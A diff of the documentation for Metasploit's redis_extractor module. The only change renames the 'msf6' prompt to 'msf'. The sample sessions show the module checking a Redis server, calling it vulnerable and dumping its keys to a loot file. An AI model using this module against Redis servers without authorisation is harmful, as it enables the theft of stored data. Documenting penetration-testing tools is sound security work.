@@ -48,24 +48,24 @@ Stop after retrieving this number of keys, per datastore. Note that one redis in
 ### Check 
 
 ```
-msf6 > use auxiliary/gather/redis_extractor
-msf6 auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
+msf > use auxiliary/gather/redis_extractor
+msf auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
 rhosts => 172.22.12.168
-msf6 auxiliary(gather/redis_extractor) > check
+msf auxiliary(gather/redis_extractor) > check
 
 [+] 172.22.12.168:6379    - Connected to Redis version 6.0.8
 [*] 172.22.12.168:6379    - OS is Linux 5.4.39-linuxkit x86_64
 [*] 172.22.12.168:6379 - The target appears to be vulnerable.
-msf6 auxiliary(gather/redis_extractor) >
+msf auxiliary(gather/redis_extractor) >
 ```
 
 ### Run
 
 ```
-msf6 > use auxiliary/gather/redis_extractor
-msf6 auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
+msf > use auxiliary/gather/redis_extractor
+msf auxiliary(gather/redis_extractor) > set rhosts 172.22.12.168
 rhosts => 172.22.12.168
-msf6 auxiliary(gather/redis_extractor) > run
+msf auxiliary(gather/redis_extractor) > run
 
 [+] 172.22.12.168:6379    - Connected to Redis version 6.0.8
 [*] 172.22.12.168:6379    - Extracting about 1 keys from database 0
@@ -80,5 +80,5 @@ Data from 172.22.12.168:6379    database 0
 [+] 172.22.12.168:6379    - Redis data stored at /root/.msf4/loot/20201113203708_default_172.22.12.168_redis.dump_db0_836292.txt
 [*] 172.22.12.168:6379    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/redis_extractor) >
+msf auxiliary(gather/redis_extractor) >
 ```
